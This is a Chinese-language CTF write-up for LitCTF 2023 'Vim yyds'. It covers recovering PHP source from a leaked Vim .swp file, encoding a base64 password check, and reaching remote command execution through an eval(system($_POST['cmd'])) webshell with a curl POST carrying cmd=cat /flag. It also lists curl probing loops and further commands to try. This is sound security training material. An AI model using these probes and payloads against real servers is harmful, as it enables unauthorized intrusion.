# 【WriteUp】[LitCTF 2023] Vim yyds ｜ NSSCTF 3866

> 日期：2026-08-01 ｜ 平台：NSSCTF ｜ 方向：Web / 文件泄露 + 源码审计 + RCE
> 描述：「漏...漏了！」 出题人：s1rius
> flag：`NSSCTF{49196411-71d3-45d1-b5a4-acf5f42cbc46}`

---

## 一、考点一览（4 个）

1. **Vim 交换文件泄露**（.swp）→ 泄露源码
2. **源码审计**（读 PHP 找逻辑）
3. **base64 编码**（绕过密码校验）
4. **命令执行漏洞 RCE**（eval(system())）

---

## 二、完整解题链（一环扣一环）

```
第1环 题目名"Vim yyds"+描述"漏...漏了！"
      → 联想到 Vim 会留下 .swp 交换文件 = 文件泄露题
第2环 探测 /.index.php.swp → 返回 200 + 12KB 真实文件 → 命中！
第3环 下载 .swp → 二进制，但可见字符原样保留 → 提取出 PHP 源码
第4环 读源码：$password + base64 校验 + eval(system($_POST['cmd']))
      → 源码告诉我：要传 password(过校验) + cmd(执行命令)
第5环 算 base64("Give_Me_Your_Flag") → POST 两个参数
第6环 cmd=cat /flag → 拿到 flag 🎉
```

---

## 三、工具全记录（重点 ★）

### ① curl —— 探测文件是否存在/使用目录扫描工具
```bash
# 探测：试访问，看返回码判断文件是否存在
for p in ".index.php.swp" ".index.php.swo" "index.php" "index.html"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://靶机/$p")
  echo "/$p -> $code"
done
# 结果：/.index.php.swp -> 200 (真实存在)  其他 -> 404
```
**判断逻辑**：返回 200+真实内容 = 文件存在；404 = 不存在。这是"目录探测"的核心。

### ② curl —— 下载 .swp 文件
```bash
curl -s "http://靶机/.index.php.swp" -o index.php.swp
```

### ③ swp_extract.py —— 从 .swp 提取源码（我写的工具）
```bash
python "C:/Users/Administrator/Desktop/ctf-project/my_learning/web/swp_extract.py" index.php.swp
```
**原理**：.swp 是 Vim 的二进制交换文件，但被编辑的可见字符会原样保留 → 提取可读字符串 = 还原源码。
（工具支持手动输入路径、防闪退。）

### ④ xxd —— 十六进制查看器（命令行，免装）
```bash
xxd -l 256 index.php.swp    # 看前256字节的十六进制
```
**意外收获**：二进制头露出 `b0VIM 9.0`、`kali`、`s1rius` —— 出题人的 Vim 版本、操作系统、用户名全暴露了。元数据也是信息收集的对象。

### ⑤ btoa() / Python —— base64 编码（离线可算）
```js
// 浏览器 F12 Console（不用联网）
btoa("Give_Me_Your_Flag")      // → R2l2ZV9NZV9Zb3VyX0ZsYWc=
atob("R2l2ZV9NZV9Zb3VyX0ZsYWc=")  // → Give_Me_Your_Flag
```
```bash
# Python 命令行（不用联网）
python -c "import base64; print(base64.b64encode(b'Give_Me_Your_Flag').decode())"
```

### ⑥ HackBar / curl —— 发 POST 拿 flag
```bash
# curl（POST 两个参数，用 & 连接）
curl -X POST "http://靶机/index.php" \
  --data-urlencode "password=R2l2ZV9NZV9Zb3VyX0ZsYWc=" \
  --data-urlencode "cmd=cat /flag"
```
HackBar 填法：URL=`http://靶机/index.php`，Method=POST，
Post data=`password=R2l2ZV9NZV9Zb3VyX0ZsYWc=&cmd=cat /flag`（空格可写 %20）

> ⚠️ **新手必踩坑**：只传 `password` 会显示"Oh You got my password!"但**没有 flag**——因为 flag 是 `cmd` 执行命令打印的，**两个参数都得传**！

---

## 四、核心漏洞解读

```php
<?php
$password = "Give_Me_Your_Flag";
if ($_POST['password'] === base64_encode($password)) {   // ① base64 校验
    echo "Oh You got my password!";
    eval(system($_POST['cmd']));                          // ② 命令执行漏洞
}
```
- **base64 校验**：`password` 必须等于 `base64($password)`，用 btoa()/python 一算就过
- **eval(system())**：`system()` 把 `cmd` 当系统命令执行（`cat /flag`）；`eval()` 画蛇添足但无妨
- 这就是 **RCE（远程命令执行）**——攻击者控制服务器终端

**可玩的 cmd**：`cat /flag` `ls /` `whoami` `find / -name "*flag*"`

---

## 五、收获总结（新知识）

| 新知识 | 一句话 |
|---|---|
| Vim .swp 泄露 | Vim 编辑留下 `.文件名.swp`，能恢复源码 |
| 目录探测 | 使用扫描工具试访问看返回码：200=存在，404=没有 |
| 十六进制查看 | 使用xxd/hex编辑器 看二进制，元数据也能挖线索 |
| base64 离线算 | btoa()/atob() 浏览器自带，不用联网/使用编解码工具 |
| 命令执行 RCE | eval(system($_POST['cmd'])) 最严重漏洞之一/一句话木马 |

## 六、工具清单（本次用到）

curl｜swp_extract.py｜xxd｜btoa()/Python base64｜HackBar｜mini_scanner.py
